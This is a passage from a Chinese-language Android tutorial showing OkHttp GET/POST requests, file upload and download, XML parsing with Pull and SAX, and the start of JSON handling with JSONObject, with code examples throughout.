<h5 id="导入依赖">导入依赖<a class="header-anchor" href="#导入依赖"> ¶ </a></h5>
<p>编辑<code>app/build.gradle</code>，添加依赖</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">    compile <span class="string">&#x27;com.squareup.okhttp3:okhttp:3.10.0&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="使用-2">使用<a class="header-anchor" href="#使用-2"> ¶ </a></h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建一个OkHttpClient的实例</span></span><br><span class="line">OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line"><span class="comment">// 创建一个(空)Request 对象：</span></span><br><span class="line">Request request = <span class="keyword">new</span> Request.Builder().build();</span><br><span class="line"><span class="comment">// 或者在Builder中设置url</span></span><br><span class="line">Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">        .url(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line">        .build();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 之后调用OkHttpClient的newCall() 方法来创建一个Call 对象，并调用它的execute() 方法来发送请求并获取服务器返回的数据</span></span><br><span class="line">Response response = client.newCall(request).execute();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 得到Response返回的具体内容</span></span><br><span class="line">String responseData = response.body().string();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果为POST 我们需要先构建出一个Request Body对象来存放待提交的参数</span></span><br><span class="line">RequestBody requestBody = <span class="keyword">new</span> FormBody.Builder()</span><br><span class="line">        .add(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">        .add(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;123456&quot;</span>)</span><br><span class="line">        .build();</span><br><span class="line"><span class="comment">// Request.Builder中调用一下post() 方法，并将RequestBody 对象传入</span></span><br><span class="line">Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">        .url(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line">        .post(requestBody)</span><br><span class="line">        .build();</span><br><span class="line"><span class="comment">// 调用execute() 方法来发送请求并获取服务器返回的数据即可。</span></span><br></pre></td></tr></table></figure>
<h6 id="get同步请求">get同步请求<a class="header-anchor" href="#get同步请求"> ¶ </a></h6>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建OkHttpClient对象</span></span><br><span class="line">OkHttpClient client = <span class="keyword">new</span> OkHttpClient.Builder()</span><br><span class="line">    .cache() <span class="comment">// 设置缓存目录（有默认）</span></span><br><span class="line">    .connectTimeout()	<span class="comment">// 设置连接超时（有默认）</span></span><br><span class="line">    .cookieJar()	<span class="comment">// cookie的读取，保存（需自己实现）</span></span><br><span class="line">    .build();</span><br><span class="line"><span class="comment">// 创建Request对象</span></span><br><span class="line">Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">    .url(address)</span><br><span class="line">    .build();</span><br><span class="line"><span class="comment">// 发送请求，获取响应</span></span><br><span class="line">Call call = client.newCall(request);</span><br><span class="line"><span class="comment">// 发送同步请求，需手动创建子线程</span></span><br><span class="line"><span class="keyword">new</span> Thread()&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Response response = call.execute();<span class="comment">//等待服务端进行响应（等待过程中会阻塞）</span></span><br><span class="line">        <span class="comment">// 判断响应状态是否正常</span></span><br><span class="line">        <span class="keyword">if</span>(response.isSuccessful())&#123;</span><br><span class="line">            <span class="comment">// 获取服务端响应的内容（文本）</span></span><br><span class="line">            String str = response.body().string();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="get异步请求">get异步请求<a class="header-anchor" href="#get异步请求"> ¶ </a></h6>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//发送异步方式的get请求</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">getAsync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//2.创建请求对象</span></span><br><span class="line">    Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">            .url(Constant.BASE_URL +</span><br><span class="line">                    <span class="string">&quot;LoginServlet?username=张三&amp;password=123&quot;</span>)</span><br><span class="line">            .build();</span><br><span class="line">    <span class="comment">//3.发送请求，获取响应</span></span><br><span class="line">    Call call = okHttpClient.newCall(request);</span><br><span class="line">    <span class="comment">//异步请求，不需要手动创建子线程</span></span><br><span class="line">    call.enqueue(<span class="keyword">new</span> Callback()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFailure</span><span class="params">(Call call, IOException e)</span> </span>&#123;</span><br><span class="line">            <span class="comment">//请求失败时执行</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onResponse</span><span class="params">(Call call, Response response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            <span class="comment">//请求成功时执行</span></span><br><span class="line">            Log.e(<span class="string">&quot;onResponse&quot;</span>,Thread.currentThread().getName());</span><br><span class="line">            Log.e(<span class="string">&quot;异步get请求的结果&quot;</span>,response.body().string());</span><br><span class="line">            <span class="comment">//执行在子线程中，不能直接修改用户界面</span></span><br><span class="line">            <span class="comment">//可以借助Handler实现</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//在实现文件下载功能时，如何获取网络文件的数据</span></span><br><span class="line"><span class="comment">//                InputStream is = response.body().byteStream();</span></span><br><span class="line"><span class="comment">//                FileOutputStream fos = new FileOutputStream(</span></span><br><span class="line"><span class="comment">//                        getExternalFilesDir(null).getAbsolutePath() + &quot;/a.jpg&quot;);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    Log.e(<span class="string">&quot;okhttp&quot;</span>,<span class="string">&quot;异步请求已发送&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h6 id="异步post：发送文本">异步post：发送文本<a class="header-anchor" href="#异步post：发送文本"> ¶ </a></h6>
<p><a href="https://www.w3school.com.cn/media/media_mimeref.asp">MIME 参考手册 (w3school.com.cn)</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//异步方式的post请求，发送文本数据</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">postAsync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//2.创建请求体对象</span></span><br><span class="line">    RequestBody requestBody = RequestBody.create(</span><br><span class="line">            MediaType.parse(<span class="string">&quot;text/plain;charset=utf-8&quot;</span>),	<span class="comment">// 根据上传类型选择相应MIME</span></span><br><span class="line">            <span class="string">&quot;username=张三&amp;password=123&quot;</span>);</span><br><span class="line">    <span class="comment">//3.创建请求对象</span></span><br><span class="line">    Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">            .url(Constant.BASE_URL + <span class="string">&quot;LoginServlet&quot;</span>)</span><br><span class="line">            .post(requestBody)<span class="comment">//设置请求方式为POST</span></span><br><span class="line">            .build();</span><br><span class="line">    <span class="comment">//4.发送请求，获取响应</span></span><br><span class="line">    Call call = okHttpClient.newCall(request);</span><br><span class="line">    <span class="comment">//异步请求，不需要手动创建子线程</span></span><br><span class="line">    call.enqueue(<span class="keyword">new</span> Callback()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFailure</span><span class="params">(Call call, IOException e)</span> </span>&#123;</span><br><span class="line">            <span class="comment">//请求失败时执行</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onResponse</span><span class="params">(Call call, Response response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            <span class="comment">//请求成功时执行</span></span><br><span class="line">            Log.e(<span class="string">&quot;onResponse&quot;</span>,Thread.currentThread().getName());</span><br><span class="line">            Log.e(<span class="string">&quot;异步get请求的结果&quot;</span>,response.body().string());</span><br><span class="line">            <span class="comment">//执行在子线程中，不能直接修改用户界面</span></span><br><span class="line">            <span class="comment">//可以借助Handler实现</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="异步post：发送表单">异步post：发送表单<a class="header-anchor" href="#异步post：发送表单"> ¶ </a></h6>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//2.创建请求体对象</span></span><br><span class="line">FormBody formBody = <span class="keyword">new</span> FormBody.Builder()</span><br><span class="line">        .add(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;张三&quot;</span>)</span><br><span class="line">        .add(<span class="string">&quot;password&quot;</span>,<span class="string">&quot;123&quot;</span>)</span><br><span class="line">        .build();</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.创建请求对象</span></span><br><span class="line">Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">        .url(Constant.BASE_URL + <span class="string">&quot;LoginServlet&quot;</span>)</span><br><span class="line">        .post(formBody)<span class="comment">//设置请求方式为POST</span></span><br><span class="line">        .build();</span><br></pre></td></tr></table></figure>
<h6 id="post本地选择文件上传">post本地选择文件上传<a class="header-anchor" href="#post本地选择文件上传"> ¶ </a></h6>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//文件上传</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">uploadFile</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">    intent.setAction(Intent.ACTION_PICK);</span><br><span class="line">    intent.setType(<span class="string">&quot;image/*&quot;</span>);</span><br><span class="line">    startActivityForResult(intent, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onActivityResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="keyword">int</span> resultCode, <span class="meta">@Nullable</span> Intent data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onActivityResult(requestCode, resultCode, data);</span><br><span class="line">    <span class="keyword">if</span> (requestCode == <span class="number">1</span> &amp;&amp; resultCode == RESULT_OK)&#123;</span><br><span class="line">        ContentResolver contentResolver = getContentResolver();</span><br><span class="line">        Cursor cursor = contentResolver.query(data.getData(),</span><br><span class="line">                <span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (cursor.moveToFirst())&#123;</span><br><span class="line">            String imagePath = cursor.getString(cursor.getColumnIndex(<span class="string">&quot;_data&quot;</span>));</span><br><span class="line">            <span class="comment">//创建请求体对象</span></span><br><span class="line">            File file = <span class="keyword">new</span> File(imagePath);</span><br><span class="line">            RequestBody requestBody = RequestBody.create(</span><br><span class="line">                    MediaType.parse(<span class="string">&quot;application/octet-stream&quot;</span>),</span><br><span class="line">                    file);</span><br><span class="line">            <span class="comment">//创建请求对象</span></span><br><span class="line">            Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                    .url(Constant.BASE_URL + <span class="string">&quot;UploadServlet&quot;</span>)</span><br><span class="line">                    .post(requestBody)</span><br><span class="line">                    .build();</span><br><span class="line">            Call call = okHttpClient.newCall(request);</span><br><span class="line">            call.enqueue(<span class="keyword">new</span> Callback() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFailure</span><span class="params">(Call call, IOException e)</span> </span>&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onResponse</span><span class="params">(Call call, Response response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                    Log.e(<span class="string">&quot;上传文件的结果&quot;</span>,response.body().string());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="post下载远端">post下载远端<a class="header-anchor" href="#post下载远端"> ¶ </a></h6>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onResponse</span><span class="params">(Call call, Response r)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">    InputStream is = response.body().byteStream();</span><br><span class="line">    File file = <span class="keyword">new</span> File(Environment.getExternalStorageDirectory(), </span><br><span class="line">                        <span class="string">&quot;test.txt&quot;</span>);</span><br><span class="line">    FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">while</span> ((len = is.read(buf)) != -<span class="number">1</span>)&#123;</span><br><span class="line">        fos.write(buf, <span class="number">0</span>, len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解析XML格式数据">解析XML格式数据<a class="header-anchor" href="#解析XML格式数据"> ¶ </a></h3>
<h4 id="Pull解析方式">Pull解析方式<a class="header-anchor" href="#Pull解析方式"> ¶ </a></h4>
<p>解析的xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">apps</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">app</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>1<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Google Maps<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">app</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">app</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>2<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Chrome<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">app</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">app</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>3<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Google Play<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">app</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">apps</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>java代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseXMLWithPull</span><span class="params">(String xmlData)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        XmlPullParserFactory factory = XmlPullParserFactory.newInstance();</span><br><span class="line">        <span class="comment">// 创建xmlPull解析器</span></span><br><span class="line">        <span class="comment">// XmlPullParser parser = Xml.newPullParser();</span></span><br><span class="line">        XmlPullParser xmlPullParser = factory.newPullParser();</span><br><span class="line">        <span class="comment">// 初始化解析器</span></span><br><span class="line">        xmlPullParser.setInput(<span class="keyword">new</span> StringReader(xmlData));</span><br><span class="line">        <span class="comment">// 当前读取的事件类型</span></span><br><span class="line">        <span class="keyword">int</span> eventType = xmlPullParser.getEventType();</span><br><span class="line">        String id = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        String name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        String version = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">// 如果没有读取到文档的末尾</span></span><br><span class="line">        <span class="keyword">while</span> (eventType != XmlPullParser.END_DOCUMENT) &#123;</span><br><span class="line">            <span class="comment">// 获得当前节点的名称</span></span><br><span class="line">            String nodeName = xmlPullParser.getName();</span><br><span class="line">            <span class="keyword">switch</span> (eventType) &#123;</span><br><span class="line">                <span class="comment">// 开始标签</span></span><br><span class="line">                <span class="keyword">case</span> XmlPullParser.START_TAG: &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="string">&quot;id&quot;</span>.equals(nodeName)) &#123;</span><br><span class="line">                        id = xmlPullParser.nextText();</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;name&quot;</span>.equals(nodeName)) &#123;</span><br><span class="line">                        name = xmlPullParser.nextText();</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;version&quot;</span>.equals(nodeName)) &#123;</span><br><span class="line">                        version = xmlPullParser.nextText();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 结束标签</span></span><br><span class="line">                <span class="keyword">case</span> XmlPullParser.END_TAG: &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="string">&quot;app&quot;</span>.equals(nodeName)) &#123;</span><br><span class="line">                        Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;id is &quot;</span> + id);</span><br><span class="line">                        Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;name is &quot;</span> + name);</span><br><span class="line">                        Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;version is &quot;</span> + version);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            eventType = xmlPullParser.next();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>首先要获取到一个XmlPullParserFactory 的实例</li>
<li>借助这个实例得到XmlPullParser 对象</li>
<li>然后调用XmlPullParser 的setInput() 方法将服务器返回的XML数据设置进去就可以开始解析了。</li>
<li>解析的过程也非常简单，通过getEventType() 可以得到当前的解析事件</li>
<li>然后在一个while循环中不断地进行解析如果当前的解析事件不等于XmlPullParser.END_DOCUMENT，说明解析工作还没完成,调用next() 方法后可以获取下一个解析事件。</li>
<li>在while 循环中，我们通过getName() 方法得到当前节点的名字，如果发现节点名等于id、name或version，就调用nextText() 方法来获取节点内具体的内容，每当解析完一个app节点后就将获取到的内容打印出来。</li>
</ol>
<h4 id="SAX解析方式">SAX解析方式<a class="header-anchor" href="#SAX解析方式"> ¶ </a></h4>
<p>模板</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyHandler</span> <span class="keyword">extends</span> <span class="title">DefaultHandler</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startDocument</span><span class="params">()</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">        <span class="comment">// startDocument() 方法会在开始XML解析的时候调用</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes</span></span></span><br><span class="line"><span class="params"><span class="function">        attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">        <span class="comment">// startElement() 方法会在开始解析某个节点的时候调用</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">characters</span><span class="params">(<span class="keyword">char</span>[] ch, <span class="keyword">int</span> start, <span class="keyword">int</span> length)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">        <span class="comment">// characters() 方法会在获取节点中内容的时候调用</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">endElement</span><span class="params">(String uri, String localName, String qName)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">        <span class="comment">// endElement() 方法会在完成解析某个节点的时候调用</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">endDocument</span><span class="params">()</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">        <span class="comment">// endDocument() 方法会在完成整个XML解析的时候调用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解析上述XML</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ContentHandler</span> <span class="keyword">extends</span> <span class="title">DefaultHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String nodeName;</span><br><span class="line">    <span class="keyword">private</span> StringBuilder id;</span><br><span class="line">    <span class="keyword">private</span> StringBuilder name;</span><br><span class="line">    <span class="keyword">private</span> StringBuilder version;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startDocument</span><span class="params">()</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">        id = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        name = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"></span><br><span class="line">        version = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes</span></span></span><br><span class="line"><span class="params"><span class="function">        attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">        <span class="comment">// 记录当前节点名</span></span><br><span class="line">        nodeName = localName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">characters</span><span class="params">(<span class="keyword">char</span>[] ch, <span class="keyword">int</span> start, <span class="keyword">int</span> length)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">        <span class="comment">// 根据当前的节点名判断将内容添加到哪一个StringBuilder对象中</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;id&quot;</span>.equals(nodeName)) &#123;</span><br><span class="line">            id.append(ch, start, length);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;name&quot;</span>.equals(nodeName)) &#123;</span><br><span class="line">            name.append(ch, start, length);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;version&quot;</span>.equals(nodeName)) &#123;</span><br><span class="line">            version.append(ch, start, length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">endElement</span><span class="params">(String uri, String localName, String qName)</span> <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">        SAXException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;app&quot;</span>.equals(localName)) &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;ContentHandler&quot;</span>, <span class="string">&quot;id is &quot;</span> + id.toString().trim());</span><br><span class="line">            Log.d(<span class="string">&quot;ContentHandler&quot;</span>, <span class="string">&quot;name is &quot;</span> + name.toString().trim());</span><br><span class="line">            Log.d(<span class="string">&quot;ContentHandler&quot;</span>, <span class="string">&quot;version is &quot;</span> + version.toString().trim());</span><br><span class="line">            <span class="comment">// 最后要将StringBuilder清空掉</span></span><br><span class="line">            id.setLength(<span class="number">0</span>);</span><br><span class="line">            name.setLength(<span class="number">0</span>);</span><br><span class="line">            version.setLength(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">endDocument</span><span class="params">()</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.endDocument();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseXMLWithSAX</span><span class="params">(String xmlData)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        SAXParserFactory factory = SAXParserFactory.newInstance();</span><br><span class="line">        XMLReader xmlReader = factory.newSAXParser().getXMLReader();</span><br><span class="line">        ContentHandler handler = <span class="keyword">new</span> ContentHandler();</span><br><span class="line">        <span class="comment">// 将ContentHandler的实例设置到XMLReader中</span></span><br><span class="line">        xmlReader.setContentHandler(handler);</span><br><span class="line">        <span class="comment">// 开始执行解析</span></span><br><span class="line">        xmlReader.parse(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(xmlData)));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解析JSON格式数据">解析JSON格式数据<a class="header-anchor" href="#解析JSON格式数据"> ¶ </a></h3>
<p>测试Json数据</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="attr">&quot;id&quot;</span>:<span class="string">&quot;5&quot;</span>,<span class="attr">&quot;version&quot;</span>:<span class="string">&quot;5.5&quot;</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;Clash of Clans&quot;</span>&#125;,</span><br><span class="line">&#123;<span class="attr">&quot;id&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="attr">&quot;version&quot;</span>:<span class="string">&quot;7.0&quot;</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;Boom Beach&quot;</span>&#125;,</span><br><span class="line">&#123;<span class="attr">&quot;id&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="attr">&quot;version&quot;</span>:<span class="string">&quot;3.5&quot;</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;Clash Royale&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>
<h4 id="使用JSONObject">使用JSONObject<a class="header-anchor" href="#使用JSONObject"> ¶ </a></h4>
<h5 id="转成Json字符串">转成Json字符串<a class="header-anchor" href="#转成Json字符串"> ¶ </a></h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JSONObject转json字符串</span></span><br><span class="line">JSONObject jsonObject = <span class="keyword">new</span> JSONObject();</span><br><span class="line">jsonObject.put(String name,Object value);</span><br><span class="line">jsonObject.put(String name,Object value);</span><br><span class="line"></span><br><span class="line">String jsonStr = jsonObject.toString();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 若是数组，写个循环生成JSONObject，然后用JSONArray对象的put方法</span></span><br></pre></td></tr></table></figure>
<h5 id="读取JSON字符串">读取JSON字符串<a class="header-anchor" href="#读取JSON字符串"> ¶ </a></h5>
